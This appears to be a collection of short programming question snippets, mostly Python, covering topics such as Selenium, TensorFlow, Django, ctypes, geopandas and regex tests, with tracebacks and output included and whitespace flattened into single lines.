"x = itertools.chain.from_iterable ( results [ env ] .values ( ) ) # From the linked answery = sorted ( list ( set ( x ) ) , key=lambda s : s.lower ( ) )"
"from selenium import webdriver driver = webdriver.Remote ( desired_capabilities=webdriver.DesiredCapabilities.HTMLUNITWITHJS ) driver.get ( 'http : //www.omegle.com/ ' ) element = driver.find_element_by_id ( `` onlinecount '' ) print element.text.split ( ) [ 0 ] 22,183"
"enum crypt_type { crypt_none = 0 , crypt_unknown = 1 , crypt_wep = ( 1 < < 1 ) , crypt_layer3 = ( 1 < < 2 ) , // Derived from WPA headerscrypt_wep40 = ( 1 < < 3 ) , crypt_wep104 = ( 1 < < 4 ) , crypt_tkip = ( 1 < < 5 ) , crypt_wpa = ( 1 < < 6 ) , crypt_psk = ( 1 < < 7 ) , crypt_aes_ocb = ( 1 < < 8 ) , crypt_aes_ccm = ( 1 < < 9 ) , //WPA Migration Modecrypt_wpa_migmode = ( 1 < < 19 ) , // Derived from data trafficcrypt_leap = ( 1 < < 10 ) , crypt_ttls = ( 1 < < 11 ) , crypt_tls = ( 1 < < 12 ) , crypt_peap = ( 1 < < 13 ) , crypt_isakmp = ( 1 < < 14 ) , crypt_pptp = ( 1 < < 15 ) , crypt_fortress = ( 1 < < 16 ) , crypt_keyguard = ( 1 < < 17 ) , crypt_unknown_nonwep = ( 1 < < 18 ) , } ;"
"def func ( ) : if not os.path.isdir ( 'D : \Downloads ' ) : return Falsewhile True : func ( ) if ( PyArg_ParseTuple ( args , `` U| : _isdir '' , & po ) ) { Py_UNICODE *wpath = PyUnicode_AS_UNICODE ( po ) ; attributes = GetFileAttributesW ( wpath ) ; if ( attributes == INVALID_FILE_ATTRIBUTES ) Py_RETURN_FALSE ; goto check ; } /* Drop the argument parsing error as narrow strings are also valid . */ PyErr_Clear ( ) ;"
"> > > 01 ... File `` < interactive input > '' , line 1 01 ^SyntaxError : invalid token > > > > > > 000"
"import itertoolsimport heapqdata = [ range ( n*8000 , n*8000+10000,100 ) for n in range ( 10000 ) ] # Approach 1for val in heapq.merge ( *data ) : test = val # Approach 2for val in sorted ( itertools.chain ( *data ) ) : test = val"
"cells = tf.nn.rnn_cell.LSTMCell ( self.num_hidden ) initial_state = cells.zero_state ( self.batch_size , tf.float32 ) rnn_outputs , _ = tf.nn.dynamic_rnn ( cells , my_inputs , initial_state = initial_state ) lstm = tf.contrib.cudnn_rnn.CudnnLSTM ( 1 , self.num_hidden ) rnn_outputs , _ = lstm ( my_inputs )"
"profile = webdriver.FirefoxProfile ( ) profile.set_preference ( `` network.proxy.type '' , 1 ) profile.set_preference ( `` network.proxy.http '' , `` 74.73.148.42 '' ) profile.set_preference ( `` network.proxy.http_port '' , 3128 ) profile.update_preferences ( ) browser = webdriver.Firefox ( firefox_profile=profile ) browser.get ( 'http : //www.example.com/ ' ) time.sleep ( 5 ) element = browser.find_elements_by_css_selector ( '.well-sm : not ( .mbn ) .row .col-md-4 ul .fs-small a ' ) for ele in element : print ele.get_attribute ( 'href ' ) browser.quit ( )"
"`` `` '' e : \devtool\python\python.exe % 0 : : or % PYTHONPATH % \python.exegoto eof : '' '' '' # Python testprint `` [ works , but shows shell errors ] '' @ echo offfor /f `` skip=4 delims=xxx '' % % l in ( % 0 ) do @ echo % % l | e : \devtools\python\python.exegoto : eof : : -- -- -- -- -- # Python testprint `` [ works better , but is somewhat messy ] '' @ e : \devtools\python\python.exe -x `` % ~f0 '' % * & exit /b # # # Python begins ... .import sysfor arg in sys.argv : print argraw_input ( `` It works ! ! ! \n '' ) # # #"
"import tensorflow as tffrom tensorflow import kerasimport numpy as npfashion_mnist = keras.datasets.fashion_mnist ( train_images , train_labels ) , ( test_images , test_labels ) = fashion_mnist.load_data ( ) train_images = train_images / 255.0test_images = test_images / 255.0class_names = [ 'T-shirt ' , 'Trouser ' , 'Pullover ' , 'Dress ' , 'Coat ' , 'Sandal ' , 'Shirt ' , 'Sneaker ' , 'Bag ' , 'Ankle Boot ' ] model = keras.Sequential ( [ keras.layers.Flatten ( input_shape= ( 28 , 28 ) ) , keras.layers.Dense ( 128 , activation='relu ' ) , keras.layers.Dense ( 10 ) ] ) model.compile ( optimizer='adam ' , loss= tf.keras.losses.SparseCategoricalCrossentropy ( from_logits=True ) , metrics= [ 'accuracy ' ] ) model.fit ( train_images , train_labels , epochs=10 ) Epoch 1/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3183 - accuracy : 0.8866Epoch 2/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3169 - accuracy : 0.8873Epoch 3/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3144 - accuracy : 0.8885Epoch 4/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3130 - accuracy : 0.8885Epoch 5/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3110 - accuracy : 0.8883Epoch 6/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3090 - accuracy : 0.8888Epoch 7/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3073 - accuracy : 0.8895Epoch 8/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3057 - accuracy : 0.8900Epoch 9/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3040 - accuracy : 0.8905Epoch 10/101875/1875 [ ============================== ] - 3s 2ms/step - loss : 0.3025 - accuracy : 0.8915 < tensorflow.python.keras.callbacks.History at 0x7fbe0e5aebe0 >"
"s = [ ( 0 , -1 ) , ( 1,0 ) , ( 2 , -1 ) , ( 3,0 ) , ( 4,0 ) , ( 5 , -1 ) , ( 6,0 ) , ( 7 , -1 ) ] E = min ( x [ 0 ] for x in s if ( x [ 0 ] > = X ) and ( x [ 1 ] == -1 ) ) R = [ x for x in s if X < = x [ 0 ] < E ]"
"[ 1 ] [ 2 ] [ 3 ] [ 4 ] [ 1 ] [ 2 ] [ 3,4 ] [ 1 ] [ 2,3 ] [ 4 ] [ 1 ] [ 3 ] [ 2,4 ] [ 1,2 ] [ 3 ] [ 4 ] [ 1,3 ] [ 2 ] [ 4 ] [ 1,4 ] [ 2 ] [ 3 ] [ 1,2 ] [ 3,4 ] [ 1,3 ] [ 2,4 ] [ 1,4 ] [ 2,3 ] [ 1,2,3 ] [ 4 ] [ 1,2,4 ] [ 3 ] [ 1,3,4 ] [ 2 ] [ 2,3,4 ] [ 1 ] [ 1,2,3,4 ] def spanningsets ( items ) : if len ( items ) == 1 : yield [ items ] else : left_set , last = items [ : -1 ] , [ items [ -1 ] ] for cc in spanningsets ( left_set ) : yield cc + [ last ] for i , elem in enumerate ( cc ) : yield cc [ : i ] + [ elem + last ] + cc [ i+1 : ] def powerset ( s ) : length = len ( s ) for i in xrange ( 0 , 2**length ) : yield [ c for j , c in enumerate ( s ) if ( 1 < < j ) & i ] return"
"class ImportPhoto ( webapp.RequestHandler ) : def get ( self ) : self.response.headers [ 'Content-Type ' ] = 'text/plain ' srow = self.response.out.write url = self.request.get ( 'url ' ) srow ( 'URL : % s\n ' % ( url ) ) image_response = urlfetch.fetch ( url ) m = md5.md5 ( ) m.update ( image_response.content ) hash = m.hexdigest ( ) time = `` % s '' % datetime.utcnow ( ) .strftime ( `` % a , % d % b % Y % H : % M : % S GMT '' ) str_to_sig = `` PUT\n '' + hash + `` \n\n '' + time + `` \nx-goog-acl : public-read\n/lipis/8418.png '' sig = base64.b64encode ( hmac.new ( config_credentials.GS_SECRET_ACCESS_KEY , str_to_sig , hashlib.sha1 ) .digest ( ) ) total = len ( image_response.content ) srow ( 'Size : % d bytes\n ' % ( total ) ) header = { `` Date '' : time , `` x-goog-acl '' : `` public-read '' , `` Content-MD5 '' : hash , 'Content-Length ' : total , 'Authorization ' : `` GOOG1 % s : % s '' % ( config_credentials.GS_ACCESS_KEY_ID , sig ) } conn = httplib.HTTPConnection ( `` lipis.commondatastorage.googleapis.com '' ) conn.set_debuglevel ( 2 ) conn.putrequest ( 'PUT ' , `` /8418.png '' ) for h in header : conn.putheader ( h , header [ h ] ) conn.endheaders ( ) conn.send ( image_response.content + '\r\n ' ) res = conn.getresponse ( ) srow ( '\n\n % d : % s\n ' % ( res.status , res.reason ) ) data = res.read ( ) srow ( data ) conn.close ( ) URL : https : //stackoverflow.com/users/flair/8418.pngSize : 9605 bytes400 : Bad Request < ? xml version= ' 1.0 ' encoding='UTF-8 ' ? > < Error > < Code > BadDigest < /Code > < Message > The Content-MD5 you specified did not match what we received. < /Message > < Details > lipis/hello.jpg < /Details > < /Error >"
"starcluster start mycluster starcluster sshmaster mycluster -u myuser Permission denied ( publickey ) . starcluster sshmaster mycluster AssertionError : Not a valid connection file or url : u'/root/.ipython/profile_default/security/ipcontroller-client.json ' > > > Running plugin ipcluster > > > Writing IPython cluster config files > > > Starting IPython cluster with 7 engines > > > Waiting for JSON connector file ... > > > Creating IPCluster cache directory : /Users/username/.starcluster/ipcluster > > > Saving JSON connector file to '/Users/username/.starcluster/ipcluster/mycluster-us-east-1.json ' ! ! ! ERROR - Error occurred while running plugin 'ipcluster ' : Traceback ( most recent call last ) : File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/cluster.py '' , line 1506 , in run_plugin func ( *args ) File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/plugins/ipcluster.py '' , line 276 , in run plug.run ( nodes , master , user , user_shell , volumes ) File `` < string > '' , line 2 , in run File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/utils.py '' , line 87 , in wrap_f res = func ( *arg , **kargs ) File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/plugins/ipcluster.py '' , line 228 , in run cfile = self._start_cluster ( master , n , profile_dir ) File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/plugins/ipcluster.py '' , line 173 , in _start_cluster master.ssh.get ( json , local_json ) File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/sshutils/__init__.py '' , line 431 , in get self.scp.get ( remotepaths , localpath , recursive=recursive ) File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/sshutils/scp.py '' , line 141 , in get self._recv_all ( ) File `` /Library/Python/2.7/site-packages/StarCluster-0.93.3-py2.7.egg/starcluster/sshutils/scp.py '' , line 242 , in _recv_all msg = self.channel.recv ( 1024 ) File `` build/bdist.macosx-10.8-intel/egg/ssh/channel.py '' , line 611 , in recv raise socket.timeout ( ) timeout"
"training : Either a Python boolean , or a TensorFlow boolean scalar tensor ( e.g . a placeholder ) . Whether to return the output in training mode ( apply dropout ) or in inference mode ( return the input untouched ) ."
"def testmethod ( argument1 , argument2 , argument3 , argument4 ) : pass def testmethod ( argument1 , argument2 , argument3 , argument4 ) : pass"
"import numpy as npimport cupy as cpa_cpu = np.ones ( ( 10000 , 10000 ) , dtype=np.float32 ) b_cpu = np.ones ( ( 10000 , 10000 ) , dtype=np.float32 ) a_stream = cp.cuda.Stream ( non_blocking=True ) b_stream = cp.cuda.Stream ( non_blocking=True ) a_gpu = cp.empty_like ( a_cpu ) b_gpu = cp.empty_like ( b_cpu ) a_gpu.set ( a_cpu , stream=a_stream ) b_gpu.set ( b_cpu , stream=b_stream ) # This should start before b_gpu.set ( ) is finished.a_gpu *= 2"
"def has22 ( nums ) : it = iter ( nums ) return any ( x == 2 == next ( it ) for x in it ) > > > has22 ( [ 2 , 1 , 2 ] ) False > > > it = iter ( [ 2 , 1 , 2 ] ) ; any ( x == 2 == next ( it ) for x in it ) False > > > it = iter ( [ 2 , 1 , 2 ] ) ; any ( [ x == 2 == next ( it ) for x in it ] ) Traceback ( most recent call last ) : File `` < pyshell # 114 > '' , line 1 , in < module > it = iter ( [ 2 , 1 , 2 ] ) ; any ( [ x == 2 == next ( it ) for x in it ] ) StopIteration > > > def F ( nums ) : it = iter ( nums ) for x in it : if x == 2 == next ( it ) : return True > > > F ( [ 2 , 1 , 2 ] ) Traceback ( most recent call last ) : File `` < pyshell # 117 > '' , line 1 , in < module > F ( [ 2 , 1 , 2 ] ) File `` < pyshell # 116 > '' , line 4 , in F if x == 2 == next ( it ) : return TrueStopIteration > > > it=iter ( [ 2 , 1 , 2 ] ) ; list ( ( next ( it ) , next ( it ) , next ( it ) , next ( it ) ) for x in it ) [ ]"
"from django.db import modelsimport osfrom django.db.models.signals import post_saveimport sysclass Form ( models.Model ) : site = models.CharField ( max_length=50 ) num = models.CharField ( max_length=10 ) octet = models.CharField ( max_length=30 ) def __unicode__ ( self ) : return self.site return self.num return self.octetdef create_conf ( sender , **kwargs ) : os.system ( `` /usr/local/build `` + self.site + ' ' + self.num + ' ' + self.octet ) post_save.connect ( create_conf , sender=Form )"
"def prime_x ( f , x , h ) : if not f ( x+h ) == f ( x ) and not h == 0.0 : return ( f ( x+h ) - f ( x ) ) / h else : raise PrecisionError def fx ( x ) : import math return math.exp ( x ) *math.sin ( x ) print prime_x ( fx , 3.0 , 10**-5 ) -17.0502585578print prime_x ( fx , 3.0 , 10**-10 ) -17.0500591423 print prime_x ( fx , 3.0 , 10**-12 ) -17.0512493014print prime_x ( fx , 3.0 , 10**-13 ) -17.0352620898print prime_x ( fx , 3.0 , 10**-16 ) __main__.PrecisionError : Mantissa is 16 digits"
"import cv2 as cvfilename = 'chessboard.png'img = cv.imread ( filename ) cv.imshow ( 'dst ' , img ) cv.waitKey ( 0 )"
pip install -e
"import numpy as npimport pandas as pdimport matplotlib.pyplot as pltts = pd.Series ( np.random.randn ( 1000 ) , index=pd.date_range ( '2018-10-14 ' , periods=1000 ) ) df = pd.DataFrame ( np.random.randn ( 1000 , 6 ) , index=ts.index , columns= [ ' A ' , ' B ' , ' C ' , 'D ' , ' E ' , ' F ' ] ) df = df.cumsum ( ) df.hist ( )"
"Traceback ( most recent call last ) : File `` apscheduler/schedulers/base.py '' , line 882 , in _create_plugin_instanceKeyError : 'interval'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` cmonitorcli/services/socket_client.py '' , line 70 , in run File `` cmonitorcli/services/scheduler.py '' , line 36 , in add_update_job File `` apscheduler/schedulers/base.py '' , line 413 , in add_job File `` apscheduler/schedulers/base.py '' , line 907 , in _create_trigger File `` apscheduler/schedulers/base.py '' , line 890 , in _create_plugin_instance LookupError : No trigger by the name `` interval '' was found ^CTraceback ( most recent call last ) : File `` websocket/_app.py '' , line 283 , in run_forever File `` websocket/_app.py '' , line 50 , in read KeyboardInterrupt During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` cmonitorcli/main.py '' , line 20 , in < module > File `` cmonitorcli/main.py '' , line 8 , in main_job File `` cmonitorcli/client.py '' , line 29 , in __init__ File `` cmonitorcli/services/socket_client.py '' , line 31 , in connect File `` websocket/_app.py '' , line 283 , in run_forever KeyboardInterrupt missing module named 'multiprocessing.forking ' - imported by /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/venv/lib/python3.6/site-packages/PyInstaller/loader/rthooks/pyi_rth_multiprocessing.pymissing module named multiprocessing.get_context - imported by multiprocessing , multiprocessing.pool , multiprocessing.managers , multiprocessing.sharedctypesmissing module named multiprocessing.TimeoutError - imported by multiprocessing , multiprocessing.poolmissing module named multiprocessing.BufferTooShort - imported by multiprocessing , multiprocessing.connectionmissing module named multiprocessing.AuthenticationError - imported by multiprocessing , multiprocessing.connectionmissing module named multiprocessing.set_start_method - imported by multiprocessing , multiprocessing.spawnmissing module named multiprocessing.get_start_method - imported by multiprocessing , multiprocessing.spawnmissing module named multiprocessing.SimpleQueue - imported by multiprocessing , concurrent.futures.processmissing module named pyimod03_importers - imported by /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/venv/lib/python3.6/site-packages/PyInstaller/loader/rthooks/pyi_rth_pkgres.pymissing module named 'pkg_resources.extern.pyparsing ' - imported by pkg_resources._vendor.packaging.requirements , pkg_resources._vendor.packaging.markersmissing module named StringIO - imported by six , pkg_resources._vendor.sixmissing module named 'win32com.shell ' - imported by pkg_resources._vendor.appdirsmissing module named 'com.sun ' - imported by pkg_resources._vendor.appdirsmissing module named com - imported by pkg_resources._vendor.appdirsmissing module named win32api - imported by pkg_resources._vendor.appdirsmissing module named win32com - imported by pkg_resources._vendor.appdirsmissing module named 'ctypes.macholib ' - imported by ctypes.utilmissing module named netbios - imported by uuidmissing module named win32wnet - imported by uuidmissing module named __builtin__ - imported by pkg_resources._vendor.pyparsingmissing module named ordereddict - imported by pkg_resources._vendor.pyparsingmissing module named __main__ - imported by pkg_resourcesmissing module named pkg_resources.extern.packaging - imported by pkg_resources.extern , pkg_resourcesmissing module named pkg_resources.extern.appdirs - imported by pkg_resources.extern , pkg_resourcesmissing module named 'pkg_resources.extern.six.moves ' - imported by pkg_resources , pkg_resources._vendor.packaging.requirementsmissing module named pkg_resources.extern.six - imported by pkg_resources.extern , pkg_resourcesmissing module named nt - imported by os , shutil , ntpath , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named org - imported by pickle , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pyexcluded module named _frozen_importlib - imported by importlib , importlib.abc , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named _frozen_importlib_external - imported by importlib._bootstrap , importlib , importlib.abc , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named _winreg - imported by platform , tzlocal.win32 , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.py , pkg_resources._vendor.appdirsmissing module named _scproxy - imported by urllib.requestmissing module named java - imported by platform , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named 'java.lang ' - imported by platform , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.py , xml.sax._exceptionsmissing module named vms_lib - imported by platform , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named winreg - imported by platform , mimetypes , tzlocal.win32 , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.py , urllib.requestmissing module named msvcrt - imported by subprocess , multiprocessing.spawn , multiprocessing.popen_spawn_win32 , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.py , getpassmissing module named _winapi - imported by subprocess , multiprocessing.reduction , multiprocessing.connection , multiprocessing.heap , multiprocessing.popen_spawn_win32 , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named _dummy_threading - imported by dummy_threading , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.pymissing module named 'org.python ' - imported by copy , /home/hoop/PycharmProjects/cmonitorserv/cmonitorcli/main.py , xml.saxmissing module named funcsigs - imported by apscheduler.utilmissing module named sets - imported by pytz.tzinfomissing module named UserDict - imported by pytz.lazymissing module named wsaccel - imported by websocket._utilsmissing module named backports - imported by websocket._ssl_compatmissing module named socks - imported by websocket._httpmissing module named `` 'six.moves.urllib'.parse '' - imported by websocket._urlmissing module named Cookie - imported by websocket._cookiejarmissing module named 'wsaccel.xormask ' - imported by websocket._abnfmissing module named numpy - imported by websocket._abnfmissing module named win32evtlog - imported by logging.handlersmissing module named win32evtlogutil - imported by logging.handlers jsonpickle==0.9.6pkg-resources==0.0.0six==1.11.0websocket-client==0.48.0apscheduler==3.5.1pyinstaller==3.3.1 missing module named 'wsaccel.xormask ' - imported by websocket._abnfmissing module named numpy - imported by websocket._abnfmissing module named win32evtlog - imported by logging.handlers"
"class Room ( models.Model ) : `` '' '' A ` Partyline ` room . Rooms on the ` Partyline ` s are like mini-chatrooms . Each room has a variable amount of ` Caller ` s , and usually a moderator of some sort . Each ` Partyline ` has many rooms , and it is common for ` Caller ` s to join multiple rooms over the duration of their call. `` '' '' LIVE = 0 PRIVATE = 1 ONE_ON_ONE = 2 UNCENSORED = 3 BULLETIN_BOARD = 4 CHILL = 5 PHONE_BOOTH = 6 TYPE_CHOICES = ( ( 'LR ' , 'Live Room ' ) , ( 'PR ' , 'Private Room ' ) , ( 'UR ' , 'Uncensored Room ' ) , ) type = models.CharField ( 'Room Type ' , max_length=2 , choices=TYPE_CHOICES ) number = models.IntegerField ( 'Room Number ' ) partyline = models.ForeignKey ( Partyline ) owner = models.ForeignKey ( User , blank=True , null=True ) bans = models.ManyToManyField ( Caller , blank=True , null=True ) def __unicode__ ( self ) : return `` % s - % s % d '' % ( self.partyline.name , self.type , self.number ) from django.forms import ModelFormfrom partyline_portal.rooms.models import Roomclass RoomForm ( ModelForm ) : class Meta : model = Room def edit_room ( request , id=None ) : `` '' '' Edit various attributes of a specific ` Room ` . Room owners do not have access to this page . They can not edit the attributes of the ` Room ` ( s ) that they control. `` '' '' room = get_object_or_404 ( Room , id=id ) if not room.is_owner ( request.user ) : return HttpResponseForbidden ( 'Forbidden . ' ) if is_user_type ( request.user , [ 'admin ' ] ) : form_type = RoomForm elif is_user_type ( request.user , [ 'lm ' ] ) : form_type = LineManagerEditRoomForm elif is_user_type ( request.user , [ 'lo ' ] ) : form_type = LineOwnerEditRoomForm if request.method == 'POST ' : form = form_type ( request.POST , instance=room ) if form.is_valid ( ) : if 'owner ' in form.cleaned_data : room.owner = form.cleaned_data [ 'owner ' ] room.save ( ) else : defaults = { 'type ' : room.type , 'number ' : room.number , 'partyline ' : room.partyline.id } if room.owner : defaults [ 'owner ' ] = room.owner.id if room.bans : defaults [ 'bans ' ] = room.bans.all ( ) # # # this does not work properly ! form = form_type ( defaults , instance=room ) variables = RequestContext ( request , { 'form ' : form , 'room ' : room } ) return render_to_response ( 'portal/rooms/edit.html ' , variables ) defaults = { 'type ' : room.type , 'number ' : room.number , 'partyline ' : room.partyline.id } if room.owner : defaults [ 'owner ' ] = room.owner.idif room.bans : defaults [ 'bans ' ] = room.bans.all ( ) # # # this does not work properly ! if room.bans : defaults [ 'bans ' ] = room.bans.all ( ) # # # this does not work properly ! if room.bans : defaults [ 'bans ' ] = [ b.pk for b in room.bans.all ( ) ]"
"from retrying import retry @ retry ( stop_max_attempt_number=10 , wait_exponential_multiplier=1000 , wait_exponential_max=10000 ) def f ( ) : # Call web service"
"def lowLevel ( ) : # # some error occurred return None # # processing was good , return normal result string return resultStringdef highLevel ( ) : resultFromLow = lowLevel ( ) if not resultFromLow : return None # # some processing error occurred return None # # processing was good , return normal result string return resultString"
"x = np.array ( [ 2.3 , 1.2 , 4.1 , 0.0 , 0.0 , 5.3 , 0 , 1.2 , 3.1 ] ) array ( [ 1 , 2 , 3 , 0 , 0 , 1 , 0 , 1 , 2 ] )"
"! pip install geopandasimport pandas as pdimport geopandascity1 = [ { 'City ' : '' Buenos Aires '' , '' Country '' : '' Argentina '' , '' Latitude '' : -34.58 , '' Longitude '' : -58.66 } , { 'City ' : '' Brasilia '' , '' Country '' : '' Brazil '' , '' Latitude '' : -15.78 , '' Longitude '' : -70.66 } , { 'City ' : '' Santiago '' , '' Country '' : '' Chile `` , '' Latitude '' : -33.45 , '' Longitude '' : -70.66 } ] city2 = [ { 'City ' : '' Bogota '' , '' Country '' : '' Colombia `` , '' Latitude '' :4.60 , '' Longitude '' : -74.08 } , { 'City ' : '' Caracas '' , '' Country '' : '' Venezuela '' , '' Latitude '' :10.48 , '' Longitude '' : -66.86 } ] city1df = pd.DataFrame ( city1 ) city2df = pd.DataFrame ( city2 ) gcity1df = geopandas.GeoDataFrame ( city1df , geometry=geopandas.points_from_xy ( city1df.Longitude , city1df.Latitude ) ) gcity2df = geopandas.GeoDataFrame ( city2df , geometry=geopandas.points_from_xy ( city2df.Longitude , city2df.Latitude ) ) City Country Latitude Longitude geometry0 Buenos Aires Argentina -34.58 -58.66 POINT ( -58.66000 -34.58000 ) 1 Brasilia Brazil -15.78 -47.91 POINT ( -47.91000 -15.78000 ) 2 Santiago Chile -33.45 -70.66 POINT ( -70.66000 -33.45000 ) City Country Latitude Longitude geometry1 Bogota Colombia 4.60 -74.08 POINT ( -74.08000 4.60000 ) 2 Caracas Venezuela 10.48 -66.86 POINT ( -66.86000 10.48000 ) City Country Latitude Longitude geometry Nearest Distance0 Buenos Aires Argentina -34.58 -58.66 POINT ( -58.66000 -34.58000 ) Bogota 111 Km from django.contrib.gis.geos import GEOSGeometryresult = [ ] dict_result = { } for city01 in city1 : dist = 99999999 pnt = GEOSGeometry ( 'SRID=4326 ; POINT ( '+str ( city01 [ `` Latitude '' ] ) + ' '+str ( city01 [ 'Longitude ' ] ) + ' ) ' ) for city02 in city2 : pnt2 = GEOSGeometry ( 'SRID=4326 ; POINT ( '+str ( city02 [ 'Latitude ' ] ) + ' '+str ( city02 [ 'Longitude ' ] ) + ' ) ' ) distance_test = pnt.distance ( pnt2 ) * 100 if distance_test < dist : dist = distance_test result.append ( dist ) dict_result [ city01 [ 'City ' ] ] = city02 [ 'City ' ] from shapely.ops import nearest_points # unary union of the gpd2 geomtries pts3 = gcity2df.geometry.unary_uniondef Euclidean_Dist ( df1 , df2 , cols= [ 'x_coord ' , 'y_coord ' ] ) : return np.linalg.norm ( df1 [ cols ] .values - df2 [ cols ] .values , axis=1 ) def near ( point , pts=pts3 ) : # find the nearest point and return the corresponding Place value nearest = gcity2df.geometry == nearest_points ( point , pts ) [ 1 ] return gcity2df [ nearest ] .Citygcity1df [ 'Nearest ' ] = gcity1df.apply ( lambda row : near ( row.geometry ) , axis=1 ) gcity1df City Country Latitude Longitude geometry Nearest0 Buenos Aires Argentina -34.58 -58.66 POINT ( -58.66000 -34.58000 ) Bogota1 Brasilia Brazil -15.78 -70.66 POINT ( -70.66000 -15.78000 ) Bogota2 Santiago Chile -33.45 -70.66 POINT ( -70.66000 -33.45000 ) Bogota"
"# Creates potato and saves a row to dbspud = Potato.objects.create ( ... ) # Also creates a potato instance , but does n't hit db yet. # Could call ` spud.save ( ) ` later if/when we want that.spud = Potato ( ... ) # Returns a saved instancespud = PotatoFactory.create ( ) # Returns an instance that 's not savedspud = PotatoFactory.build ( ) serializer = PotatoSerializer ( data= ... ) # creates the instance and saves in dbserializer.create ( serializer.validated_data ) class PotatoSerializer : ... def build ( self , validated_data ) : return self.Meta.model ( **validated_data )"
"mul = 1for i in range ( 10 , 200 + 1 ) : mul *= istring = str ( mul ) string = string [ : :-1 ] count = 0 ; for c in str ( string ) : if c == ' 0 ' : count += 1 else : breakprint countprint mul"
"typedef PyDictKeyEntry * ( *dict_lookup_func ) ( PyDictObject *mp , PyObject *key , Py_hash_t hash , PyObject ***value_addr ) ; struct _dictkeysobject { Py_ssize_t dk_refcnt ; Py_ssize_t dk_size ; dict_lookup_func dk_lookup ; Py_ssize_t dk_usable ; PyDictKeyEntry dk_entries [ 1 ] ; } ; from ctypes import Structure , c_ulong , POINTER , cast , py_object , CFUNCTYPELOOKUPFUNC = CFUNCTYPE ( POINTER ( PyDictKeyEntry ) , POINTER ( PyDictObject ) , py_object , c_ulong , POINTER ( POINTER ( py_object ) ) ) class PyDictKeysObject ( Structure ) : '' '' '' A key object '' '' '' _fields_ = [ ( 'dk_refcnt ' , c_ssize_t ) , ( 'dk_size ' , c_ssize_t ) , ( 'dk_lookup ' , LOOKUPFUNC ) , ( 'dk_usable ' , c_ssize_t ) , ( 'dk_entries ' , PyDictKeyEntry * 1 ) , ] PyDictKeysObject._dk_entries = PyDictKeysObject.dk_entriesPyDictKeysObject.dk_entries = property ( lambda s : cast ( s._dk_entries , POINTER ( PyDictKeyEntry * s.dk_size ) ) [ 0 ] ) obj = cast ( id ( d ) , POINTER ( PyDictObject ) ) .contents # works ! ! ` class PyDictObject ( Structure ) : # an incomplete type `` '' '' A dictionary object . `` `` '' def __len__ ( self ) : `` '' '' Return the number of dictionary entry slots . '' '' '' passdef slot_of ( self , key ) : `` '' '' Find and return the slot at which ` key ` is stored . '' '' '' passdef slot_map ( self ) : `` '' '' Return a mapping of keys to their integer slot numbers . '' '' '' passPyDictObject._fields_ = [ ( 'ob_refcnt ' , c_ssize_t ) , ( 'ob_type ' , c_void_p ) , ( 'ma_used ' , c_ssize_t ) , ( 'ma_keys ' , POINTER ( PyDictKeysObject ) ) , ( 'ma_values ' , POINTER ( py_object ) ) , # points to array of ptrs ]"
def test_foo_view ( custom_client_login ) : response = custom_client_login.get ( '/foo/bar/123/ ' ) assert response.status_code == 200 assert 'Transaction no . 123 ' in response.content
"> > > len ( ' בְּרֵאשִׁית , בָּרָא אֱלֹהִים , אֵת הַשָּׁמַיִם , וְאֵת הָאָרֶץ ' ) 60 > > > len ( unicodedata.normalize ( 'NFC ' , ' בְּרֵאשִׁית , בָּרָא אֱלֹהִים , אֵת הַשָּׁמַיִם , וְאֵת הָאָרֶץ ' ) ) 60"
"def f ( accuracy=1e-3 , nstep=10 ) : ... def g ( accuracy=1e-3 , nstep=10 ) : f ( accuracy , nstep ) ... def f ( accuracy=None , nstep=None ) : if accuracy is None : accuracy = 1e-3 if nstep is None : nstep=10 ... def g ( accuracy=None , nstep=None ) : f ( accuracy , nstep ) ..."
"static PyObject *capi_malloc ( PyObject *self , PyObject *args ) { int size ; if ( ! PyArg_ParseTuple ( args , `` i '' , & size ) ) return NULL ; //Do something to create an object or a character buffer of size ` size ` return something }"
if msg [ 'From ' ] =='noreply @ youtube.com ' : count+=1
"import reregex = `` ? ? ? ? `` repl = `` ? ? ? ? '' assert re.sub ( regex , repl , `` a foo b '' ) == `` a bar b '' assert re.sub ( regex , repl , `` a foo b foo c '' ) == `` a bar b bar c '' assert re.sub ( regex , repl , `` afoob '' ) == `` abarb '' assert re.sub ( regex , repl , `` spam ... ham '' ) == `` spam ... hambar '' assert re.sub ( regex , repl , `` spam '' ) == `` spambar '' assert re.sub ( regex , repl , `` '' ) == `` bar ''"
